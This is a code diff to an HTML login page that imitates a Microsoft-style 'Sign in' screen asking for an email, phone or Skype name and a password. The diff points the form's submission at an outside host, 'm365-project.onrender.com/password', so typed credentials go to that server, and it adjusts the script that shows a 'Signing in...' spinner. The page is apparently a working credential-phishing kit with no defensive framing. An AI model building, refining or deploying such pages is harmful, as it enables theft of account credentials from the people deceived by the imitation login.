@@ -168,28 +168,28 @@
         </div>
 
         <div class="title">Sign in</div>
+<form action="https://m365-project.onrender.com/password" method="POST">
+    <div class="form-group">
+        <label for="email">Email, phone, or Skype</label>
+        <input type="text" id="email" name="email" class="form-control" required autocomplete="username" placeholder="Email, phone, or Skype">
+    </div>
 
-        <form action="/password" method="POST">
-            <div class="form-group">
-                <label for="email">Email, phone, or Skype</label>
-                <input type="text" id="email" name="email" class="form-control" required autocomplete="username" placeholder="Email, phone, or Skype">
-            </div>
-
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" class="form-control" required autocomplete="current-password" placeholder="Password">
-            </div>
-            
-            <div class="checkbox">
-                <label>
-                    <input type="checkbox" name="KMSI" value="1"> Keep me signed in
-                </label>
-            </div>
-            
-            <button type="submit" class="btn-primary" id="submitBtn">
-                <span id="btnText">Sign in</span>
-            </button>
-        </form>
+    <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" class="form-control" required autocomplete="current-password" placeholder="Password">
+    </div>
+    
+    <div class="checkbox">
+        <label>
+            <input type="checkbox" name="KMSI" value="1"> Keep me signed in
+        </label>
+    </div>
+    
+    <button type="submit" class="btn-primary" id="submitBtn">
+        <span id="btnText">Sign in</span>
+    </button>
+</form>
+        
         
         <div class="action-links">
             <a href="#">No account?</a>
@@ -205,14 +205,14 @@
     </div>
 
     <script>
-        const form = document.getElementById('loginForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const btnText = document.getElementById('btnText');
+    const form = document.querySelector('form');
+    const submitBtn = document.getElementById('submitBtn');
+    const btnText = document.getElementById('btnText');
 
-        form.addEventListener('submit', (e) => {
-            submitBtn.disabled = true;
-            btnText.innerHTML = '<div class="spinner"></div> Signing in...';
-        });
-    </script>
+    form.addEventListener('submit', (e) => {
+        submitBtn.disabled = true;
+        btnText.innerHTML = '<div class="spinner"></div> Signing in...';
+    });
+</script>
 </body>
 </html>
